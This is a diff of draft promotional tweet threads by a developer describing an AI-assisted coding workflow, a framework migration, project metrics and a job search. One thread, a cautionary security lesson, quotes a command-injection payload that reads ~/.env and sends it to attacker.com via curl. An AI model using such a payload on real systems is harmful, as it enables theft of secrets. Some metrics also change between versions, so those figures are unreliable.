@@ -68,78 +68,79 @@ New: "Building AI apps with @claudeai & @GoogleDeepMind Antigravity | 3 apps in 
 ```
 I built 3 production apps in 3 months.
 
-Not a single line manually written.
+Not by grinding 12-hour days.
 
-Here's the system I developed 🧵
+By building a system where AI does 90% of the implementation while I architect, validate, and steer.
+
+Here's the exact workflow I developed 🧵
 ```
 
 **Tweet 2:**
 ```
-Phase 1: Vision (@claudeai Desktop)
+Phase 1: Vision (@claudeai Desktop + Opus 4.5)
 
-Before touching code, I design with Opus 4.5.
+Before touching code, I spend HOURS in conversation with Claude.
 
-I use a "meta-prompt"—a prompt to build other prompts.
+I use a "meta-prompt"—a prompt that builds other prompts.
 
-Output: Refined specs with architecture, constraints, success criteria.
+The output: Refined specs with architecture diagrams, constraints, edge cases, and success criteria all mapped out.
 ```
 
 **Tweet 3:**
 ```
 Phase 2: Build (@GoogleDeepMind Antigravity IDE)
 
-Paste the prompt. Plan for hours before coding.
+I paste my refined prompt into the IDE and let it PLAN before it codes.
 
-Then let Opus implement.
+Sometimes for 20+ minutes of pure reasoning.
 
-Output: Typesafe code from an agreed-upon blueprint.
+Then Opus implements—from database schema to API routes to UI components—following our agreed blueprint exactly.
 ```
 
 **Tweet 4:**
 ```
 Phase 3: Research (@perabornnnn)
 
-When errors appear, switch to Perplexity.
+When I hit errors (and you WILL hit errors), I switch to Perplexity.
 
-It reads docs, Stack Overflow, GitHub Issues.
+It reads documentation, Stack Overflow threads, GitHub Issues in real-time.
 
-Output: Context-rich prompts that unblock the AI.
+The output: Context-rich prompts that include exactly what the AI needs to unblock itself.
 ```
 
 **Tweet 5:**
 ```
 Phase 4: Test (@GoogleAI Gemini Flash 3)
 
-Two custom workflows:
-• /unit-test
-• /api-test
+I built two custom testing workflows:
 
-Output: Tests that catch AI bugs before main.
+• /unit-test → generates comprehensive test suites with edge cases
+• /api-test → tests endpoints, validates responses, checks error handling
+
+These catch AI bugs BEFORE they hit main.
 ```
 
 **Tweet 6:**
 ```
-Phase 5: Review (GitHub Bots)
+Phase 5: Review (Multi-Agent Code Review)
 
-Every PR gets reviewed by:
-• @QodoAI (edge cases)
-• @GoogleAI Code Assist (security)
+Every single PR gets reviewed by:
+• @QodoAI → catches edge cases and logic errors
+• @GoogleAI Code Assist → scans for security vulnerabilities
 
-Output: Catches what I missed.
+Bots find what my eyes miss. This isn't optional—it's how you ship AI code safely.
 ```
 
 **Tweet 7 (CTA):**
 ```
-The full loop:
+The full orchestration loop:
 
-@claudeai → @GoogleDeepMind Antigravity → @perabornnnn → @GoogleAI → Bots → Merge
+@claudeai → @GoogleDeepMind Antigravity → @perabornnnn → @GoogleAI → Bot Reviews → Merge
 
-18 blog posts documenting this:
+I documented every detail across 18 technical blog posts:
 jordanhindo.dev/blog
 
-Looking for Forward Deployed or AI Engineer roles.
-
-DM me.
+Looking for Forward Deployed or AI Engineer roles. DM me if you're hiring.
 ```
 
 ---
@@ -150,47 +151,63 @@ DM me.
 ```
 4 hours into debugging hell.
 
-@CopilotKit was fundamentally broken.
+My AI tools were SAYING they executed.
 
-Here's what happened 🧵
+But the handlers never fired.
+
+I traced it into @CopilotKit's source code and found an execution issue deep in their runtime.
+
+Here's how I escaped 🧵
 ```
 
 **Tweet 2:**
 ```
-The AI was SAYING it called my tools.
+The symptom: The LLM response included tool calls with perfect parameters.
 
-But the handlers never executed.
+The reality: My handler functions never ran.
 
-I verified it in their source code.
+I added console.logs everywhere. Nothing.
 
-Framework bug.
+Traced it to their useCoAgentAction hook—the callback registration was silently failing under certain conditions.
 ```
 
 **Tweet 3:**
 ```
-Two choices:
+Now I had a decision:
 
-A) Wait for fix (unknown timeline)
-B) Migrate to @vercel AI SDK (3 hours)
+A) Wait for a fix from maintainers (unknown timeline, maybe weeks)
+B) Migrate my entire AI backend to @vercel AI SDK (estimated 3-4 hours)
 
-I chose B.
+The sunk cost fallacy was screaming at me.
+
+"You've invested so much already..."
+
+I chose B anyway.
 ```
 
 **Tweet 4:**
 ```
-By 5:30 PM, tools worked.
+By 5:30 PM, everything worked.
 
-Lesson: Sunk cost is a trap.
+The @vercel AI SDK migration ended up being CLEANER than the original architecture.
 
-4 hours debugging is already lost.
+Lesson learned:
 
-Don't lose 40 more to stubbornness.
+4 hours debugging is already lost time.
+Don't compound the loss with 40 more hours of stubbornness.
+
+Sometimes the fastest path forward is sideways.
 ```
 
 **Tweet 5:**
 ```
-Full post-mortem with code:
+Full post-mortem with code diffs, architecture diagrams, and the exact debugging steps:
+
 jordanhindo.dev/blog/asset-hatch/part-3-the-crisis-when-frameworks-fail
+
+If you're building AI apps and hitting weird framework issues—this might save you a day.
+
+More debugging war stories coming.
 ```
 
 ---
@@ -199,35 +216,45 @@ jordanhindo.dev/blog/asset-hatch/part-3-the-crisis-when-frameworks-fail
 
 **Tweet 1:**
 ```
-📊 The numbers from my last project:
+📊 The real numbers from my last AI-assisted project:
 
-60 hours → 4,400 lines of production code
+60 hours of work → 4,400 lines of production-ready code
+
+That's approximately 73 lines per hour of focused development time.
+
+Here's the full breakdown 🧵
 ```
 
 **Tweet 2:**
 ```
-87% test coverage
-100% type safety (zero "any")
-70% time savings vs traditional dev
+Quality metrics that actually matter:
+
+→ 100% test coverage (unit + integration)
+→ 100% TypeScript type safety (literally zero "any" types)
+→ 70% estimated time savings vs traditional development
+→ 22 Architecture Decision Records documenting every major choice
 ```
 
 **Tweet 3:**
 ```
-AI didn't replace me.
+The paradigm shift I've learned:
 
-It amplified me.
+AI didn't replace me. It amplified me.
 
-The skill isn't coding anymore. It's:
+The valuable skill isn't writing code anymore. It's:
 
-→ Architecting systems worth building
-→ Prompting AI with precision
-→ Validating outputs critically
+→ Architecting systems worth building in the first place
+→ Prompting AI with surgical precision
+→ Validating outputs with critical skepticism
 ```
 
 **Tweet 4:**
 ```
-Full breakdown:
+Full breakdown of the metrics, methodology, and what I'd do differently:
+
 jordanhindo.dev/blog/catwalk-blog/07-lessons-learned-ai-orchestrator-handbook
+
+This post is basically my playbook for AI-assisted development. Take whatever's useful.
 ```
 
 ---
@@ -236,35 +263,44 @@ jordanhindo.dev/blog/catwalk-blog/07-lessons-learned-ai-orchestrator-handbook
 
 **Tweet 1:**
 ```
-AI generates happy paths.
+AI is really good at generating happy paths.
 
-Security requires adversarial thinking.
+But security requires adversarial thinking—imagining how things break, not just how they work.
 
-Here's a vulnerability AI missed in my code 🧵
+Here's a real vulnerability AI generated in my code that I almost shipped 🧵
 ```
 
 **Tweet 2:**
 ```
-package_name = user_input["package"]
-# Injected directly into shell
+The code AI wrote:
 
-The attack:
-"@evil/pkg; curl http://attacker.com/steal"
+package_name = user_input["package"]
+# Passed directly into a shell command
+
+The attack vector:
+"@evil/pkg; curl http://attacker.com/steal?data=$(cat ~/.env)"
+
+Classic command injection. The AI had no adversarial imagination.
 ```
 
 **Tweet 3:**
 ```
-Multi-agent code review (@QodoAI) caught it.
+What caught it: Multi-agent code review.
 
-I didn't.
+@QodoAI flagged the unsanitized input during PR review.
 
-Lesson: AI builds features. Humans find exploits.
+I had looked at that code three times and missed it.
+
+The lesson: AI builds features fast. Humans (or other AIs) must think like attackers.
 ```
 
 **Tweet 4:**
 ```
-Full security audit:
+Full security audit breakdown—6 vulnerability categories I now check for in every AI-generated codebase:
+
 jordanhindo.dev/blog/catwalk-blog/06-security-awakening-what-ai-missed
+
+This post might save you from shipping something dangerous.
 ```
 
 ---
@@ -273,26 +309,30 @@ jordanhindo.dev/blog/catwalk-blog/06-security-awakening-what-ai-missed
 
 **Tweet 1:**
 ```
-I was building a SaaS.
+I started building a SaaS with paid tiers and subscription infrastructure.
 
-Then I realized open source was the smarter play.
+Then I realized: for my actual goal (getting hired), open source was the smarter play.
+
+Here's why I pivoted 🧵
 ```
 
 **Tweet 2:**
 ```
-Why?
+Why open source over SaaS for a job search:
 
-→ Portfolio piece for job search
-→ MIT license = anyone can use it
-→ Proves I can ship, not just talk
+→ It's a portfolio piece that hiring managers can actually inspect
+→ MIT license = anyone can use it, fork it, learn from it
+→ It proves I can ship REAL software, not just talk about hypothetical projects
+→ The technical blog series adds credibility
 ```
 
 **Tweet 3:**
 ```
 The project: Asset Hatch
-→ AI-powered game asset generator
-→ Built with @vercel AI SDK
-→ 18-part technical blog series
+
+→ AI-powered 2D game asset generator (sprites, tilesets, characters)
+→ Built with @vercel AI SDK + Next.js 15 + PostgreSQL
+→ 18-part technical blog series documenting every decision
 
 Demo: asset-hatch.vercel.app
 Blog: jordanhindo.dev/blog
@@ -304,22 +344,35 @@ Looking for AI Engineer roles. DM me.
 
 ### Day 6: Quote Tweet Strategy
 
-Instead of a thread, engage with AI-related content:
-- Quote-tweet something from @AnthropicAI, @OpenAI, @vercel
-- Add your take or experience
+Instead of a standalone thread, engage with trending AI-related content:
+- Quote-tweet something interesting from @AnthropicAI, @OpenAI, @vercel, or @GoogleDeepMind
+- Add your personal take or real experience
 
-Example:
+**Example quote tweet:**
 ```
-[Quote tweet about AI coding tools]
+[Quote tweet about AI coding assistants or vibe coding]
 
-This is exactly how I built 3 apps in 3 months.
+This is exactly how I built 3 production apps in 3 months.
 
-The meta: don't just use AI. Build a system around it.
+The meta-lesson: don't just USE AI tools. Build a repeatable SYSTEM around them.
 
-Mine:
+My stack:
 @claudeai (vision) → @GoogleDeepMind Antigravity (build) → @perabornnnn (research) → @GoogleAI (test)
 
-Blog: jordanhindo.dev/blog
+Documented the whole thing: jordanhindo.dev/blog
+```
+
+**Alternative template for AI news:**
+```
+[Quote tweet about new AI model release or feature]
+
+Already tested this on a real project.
+
+Here's what actually changed in practice: [specific observation]
+
+Been documenting my AI-assisted development workflow for 4+ months now.
+
+Full blog series: jordanhindo.dev/blog
 ```
 
 ---
@@ -328,39 +381,49 @@ Blog: jordanhindo.dev/blog
 
 **Tweet 1:**
 ```
-4.5 months building full-stack AI apps.
+4.5 months building full-stack AI applications.
 
-3 production apps.
-39 technical blog posts.
-Deployed to @vercel + @flabornnnn.
+3 production apps shipped to real users.
+39 technical blog posts published.
+Deployed to @vercel + @flabornnnn in production.
 
-Now I'm looking for my next challenge 🧵
+Now I'm looking for my next challenge.
+
+Here's what I bring 🧵
 ```
 
 **Tweet 2:**
 ```
-What I bring:
+Technical depth:
 
-→ AI orchestration (@claudeai, GPT-5, @vercel AI SDK)
-→ Full-stack (Next.js, Python, PostgreSQL)
-→ Documentation obsession (22 ADRs on one project)
+→ AI orchestration & prompt engineering (@claudeai, GPT-4/5, @vercel AI SDK)
+→ Full-stack development (Next.js 15, Python, TypeScript, PostgreSQL)
+→ Obsessive documentation (22 Architecture Decision Records on my last project alone)
+→ Production mindset (testing, security audits, CI/CD)
 ```
 
 **Tweet 3:**
 ```
-What I'm looking for:
+Roles I'm targeting:
 
-→ Forward Deployed Engineer (@AnthropicAI, @Palantir)
-→ AI Application Engineer (@OpenAI, @vercel)
-→ Solutions Engineer / Developer Advocate
+→ Forward Deployed Engineer (@AnthropicAI, @Palantir, @Replit)
+→ AI Application Engineer (@OpenAI, @vercel, @replabornnnn)
+→ Solutions Engineer / Developer Advocate (AI-focused companies)
+
+I want to help teams ship AI products that actually work.
 ```
 
 **Tweet 4:**
 ```
+Everything I've built is public:
+
 Portfolio: jordanhindo.dev
 GitHub: github.com/zenchantlive
+Blog: jordanhindo.dev/blog
 
-Know anyone hiring? RT appreciated 🙏
+If you're hiring for AI engineering roles—or know someone who is—RT appreciated 🙏
+
+DMs are open.
 ```
 
 ---
